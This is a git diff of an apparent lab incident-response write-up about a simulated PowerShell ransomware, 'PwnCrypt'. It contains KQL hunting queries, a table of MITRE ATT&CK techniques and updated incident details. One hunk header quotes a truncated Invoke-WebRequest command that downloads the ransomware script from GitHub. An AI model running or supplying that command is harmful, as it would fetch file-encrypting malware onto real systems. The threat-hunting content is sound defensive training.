@@ -3,7 +3,8 @@
 
 ## **Incident Response Plan: Zero-Day Ransomware (PwnCrypt) Outbreak**  
 
-![image (11)](https://github.com/user-attachments/assets/abe54490-9d72-416b-8e9c-ac8746484da3)
+![image](https://github.com/user-attachments/assets/4af1dea9-ec80-4b9e-b493-e4a914342a17)
+
 
 ### **Scenario**  
 A new ransomware strain, **PwnCrypt**, has emerged. It utilizes a PowerShell-based payload to encrypt files, appending `.pwncrypt` to filenames (e.g., `hello.txt → hello.pwncrypt.txt`). The payload is downloaded using `Invoke-WebRequest` via PowerShell and targets specific directories like `C:\Users\Public\Desktop`. The CISO has raised concerns, and immediate investigation is required.  
@@ -63,10 +64,12 @@ DeviceProcessEvents
 #### **Outbound Network Activity:**  
 ```kql
 DeviceNetworkEvents
+| where DeviceName == "marcels-vm"
 | where RemoteUrl has "githubusercontent.com"
-| project Timestamp, DeviceName, RemoteIP, RemoteUrl, InitiatingProcessCommandLine, AccountName
+| project Timestamp, DeviceName, RemoteIP, RemoteUrl, InitiatingProcessCommandLine
 ```
-![Screenshot 2025-01-09 114155](https://github.com/user-attachments/assets/3dad1d63-ddbf-4790-a3b4-e8853f253314)
+![image](https://github.com/user-attachments/assets/0407230a-805f-4b40-a7b4-f4660ea68344)
+
 
 ---
 
@@ -77,12 +80,14 @@ DeviceNetworkEvents
 - **PowerShell Usage:** Execution of `pwncrypt.ps1` via `Invoke-WebRequest`.  
 - **Outbound Traffic:** Connection to GitHub for payload download.  
 - **File Events:** Creation of `.pwncrypt` files in user directories.  
-
+---
 **TTPs Mapped to MITRE ATT&CK Framework:**  
-- **T1059.001**: Command and Scripting Interpreter (PowerShell).  
-- **T1486**: Data Encrypted for Impact (Ransomware).  
-- **T1105**: Ingress Tool Transfer (Downloading payloads).  
-- **T1547**: Boot/Logon Autostart Execution (Persistence).  
+| **ID**       | **Technique**                                                           | **Description**                                                                                          |
+|--------------|---------------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------|
+| T1059.001    | [Command and Scripting Interpreter: PowerShell](https://attack.mitre.org/techniques/T1059/001/) | Use of PowerShell to execute commands or scripts, often for automation, execution, or evasion.           |
+| T1486        | [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486/)  | Files are encrypted to prevent access, commonly seen in ransomware attacks to extort payment.            |
+| T1105        | [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)      | Downloading or transferring tools, scripts, or payloads to a compromised system for further operations.  |
+| T1547        | [Boot or Logon Autostart Execution](https://attack.mitre.org/techniques/T1547/) | Techniques that enable persistence by configuring malicious code to execute at system startup or logon. |  
 
 ---
 
@@ -114,7 +119,7 @@ DeviceNetworkEvents
 ---
 
 ### **6. Documentation**  
-📌 **Goal:** Record findings and actions taken.  
+**Goal:** Record findings and actions taken.  
 
 **What to Document:**  
 - Timeline of events.  
@@ -141,8 +146,7 @@ Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacif
 ```
 
 **Incident Start Time:**  
-- **Date:** Jan 09, 2025  
-- **Time:** 9:45 AM  
+- **Date & Time:** 2025-04-07T19:33:51.1226556Z
 - **IP:** 185.199.111.133  
 
 ---
